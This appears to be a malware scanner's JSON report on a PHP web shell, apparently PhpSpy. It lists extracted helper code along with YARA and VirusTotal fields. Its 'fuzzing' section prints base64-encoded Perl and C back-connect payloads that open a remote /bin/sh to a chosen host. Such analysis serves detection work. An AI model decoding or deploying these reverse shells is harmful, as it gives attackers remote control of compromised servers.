            "\t\t\t\t$tabledump.=\", \";",
            "\t\t\t} else {",
            "\t\t\t\t$firstfield=0;",
            "\t\t\t}",
            "\t\t\tif (!isset($row[$fieldcounter])) {",
            "\t\t\t\t$tabledump .= \"NULL\";",
            "\t\t\t} else {",
            "\t\t\t\t$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";",
            "\t\t\t}",
            "\t\t$tabledump .= \");\\n\";",
            "\t\tif ($fp) {",
            "\t\t\tfwrite($fp,$tabledump);",
            "\t\t} else {",
            "\t\t\techo $tabledump;",
            "\tfr($rows);",
            "\tif ($fp) {",
            "\t\tfwrite($fp,\"\\n\");",
            "\t} else {",
            "\t\techo \"\\n\";",
            "function ue($str){",
            "\treturn urlencode($str);",
            "function p($str){",
            "\techo $str.\"\\n\";",
            "function tbhead() {",
            "\tp('<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\">');",
            "function tbfoot(){",
            "\tp('</table>');",
            "function makehide($name,$value=''){",
            "\tp(\"<input id=\\\"$name\\\" type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\" />\");",
            "function makeinput($arg = array()){",
            "\t$arg['size'] = $arg['size'] > 0 ? \"size=\\\"$arg[size]\\\"\" : \"size=\\\"100\\\"\";",
            "\t$arg['extra'] = $arg['extra'] ? $arg['extra'] : '';",
            "\t!$arg['type'] && $arg['type'] = 'text';",
            "\t$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';",
            "\t$arg['class'] = $arg['class'] ? $arg['class'] : 'input';",
            "\tif ($arg['newline']) {",
            "\t\tp(\"<p>$arg[title]<input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] /></p>\");",
            "\t} else {",
            "\t\tp(\"$arg[title]<input class=\\\"$arg[class]\\\" name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" value=\\\"$arg[value]\\\" type=\\\"$arg[type]\\\" $arg[size] $arg[extra] />\");",
            "function makeselect($arg = array()){",
            "\tif ($arg['onchange']) {",
            "\t\t$onchange = 'onchange=\"'.$arg['onchange'].'\"';",
            "\t$arg['title'] = $arg['title'] ? $arg['title'] : '';",
            "\tif ($arg['newline']) p('<p>');",
            "\tp(\"$arg[title] <select class=\\\"input\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" $onchange>\");",
            "\t\tif (is_array($arg['option'])) {",
            "\t\t\tforeach ($arg['option'] as $key=>$value) {",
            "\t\t\t\tif ($arg['selected']==$key) {",
            "\t\t\t\t\tp(\"<option value=\\\"$key\\\" selected>$value</option>\");",
            "\t\t\t\t} else {",
            "\t\t\t\t\tp(\"<option value=\\\"$key\\\">$value</option>\");",
            "\t\t\t\t}",
            "\t\t\t}",
            "\tp(\"</select>\");",
            "\tif ($arg['newline']) p('</p>');",
            "function formhead($arg = array()) {",
            "\t!$arg['method'] && $arg['method'] = 'post';",
            "\t!$arg['action'] && $arg['action'] = $self;",
            "\t$arg['target'] = $arg['target'] ? \"target=\\\"$arg[target]\\\"\" : '';",
            "\t!$arg['name'] && $arg['name'] = 'form1';",
            "\tp(\"<form name=\\\"$arg[name]\\\" id=\\\"$arg[name]\\\" action=\\\"$arg[action]\\\" method=\\\"$arg[method]\\\" $arg[target]>\");",
            "\tif ($arg['title']) {",
            "\t\tp('<h2>'.$arg['title'].' &raquo;</h2>');",
            "function maketext($arg = array()){",
            "\t!$arg['cols'] && $arg['cols'] = 100;",
            "\t!$arg['rows'] && $arg['rows'] = 25;",
            "\t$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';",
            "\tp(\"<p>$arg[title]<textarea class=\\\"area\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" cols=\\\"$arg[cols]\\\" rows=\\\"$arg[rows]\\\" $arg[extra]>$arg[value]</textarea></p>\");",
            "function formfooter($name = ''){",
            "\t!$name && $name = 'submit';",
            "\tp('<p><input class=\"bt\" name=\"'.$name.'\" id=\\\"'.$name.'\\\" type=\"submit\" value=\"Submit\"></p>');",
            "\tp('</form>');",
            "function formfoot(){",
            "\tp('</form>');",
            "// ????",
            "function pr($a) {",
            "\techo '<pre>';",
            "\tprint_r($a);",
            "\techo '</pre>';"
        ],
        "file": {},
        "fuzzing": {
            "String too long": [
                "\t$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".",
                "\t\t\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".",
                "\t\t\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".",
                "\t\t\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".",
                "\t\t\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".",
                "\t\t\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".",
                "\t$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\".",
                "\t\t\"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\".",
                "\t\t\"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\".",
                "\t\t\"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\".",
                "\t\t\"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\".",
                "\t\t\"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\".",
                "\t\t\"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\".",
                "\t\t\"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";"
            ]
        },
        "ip": [],
        "url": [
            "http://www.4ngel.net/phpspy/plugin/",
            "http://www.4ngel.net"
        ]
    },
    "time": "0:00:00.670333",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "Javascript_exploit_and_obfuscation.yar": "possible_includes_base64_packed_functions"
        }
    ]
}
